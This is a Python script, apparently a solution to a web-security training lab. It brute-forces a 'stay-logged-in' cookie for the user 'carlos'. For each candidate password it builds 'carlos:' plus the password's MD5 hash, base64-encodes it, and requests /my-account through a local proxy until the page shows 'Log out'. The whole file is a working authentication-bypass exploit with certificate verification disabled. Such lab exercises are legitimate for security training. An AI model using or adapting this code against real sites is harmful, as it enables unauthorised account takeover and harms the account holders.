import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def access_carlos_account(url):
    with open('passwords.txt', 'r') as file:
        for password in file:
            hashed_password = 'carlos:' + hashlib.md5(
                password.rstrip('\r\n').encode("utf-8")).hexdigest()
            encoded_password = base64.b64encode(
                bytes(hashed_password, "utf-8"))
            decoded_password = encoded_password.decode("utf-8")
            response  = requests.Session()
            myaccount_url = url + "/my-account"
            cookies = {'stay-logged-in': decoded_password}
            request = response.get(
                myaccount_url,
                cookies=cookies,
                verify=False,
                proxies=proxies)
            if "Log out" in request.text:
                return password
        raise ValueError("Carlos's password was not found.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("(+) Brute-forcing Carlos's password...")
        password = access_carlos_account(url)
        print("[+] Carlos's password is '%s'" % password)
    except IndexError:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The authentication attack was not successful.")
        sys.exit(FAIL)  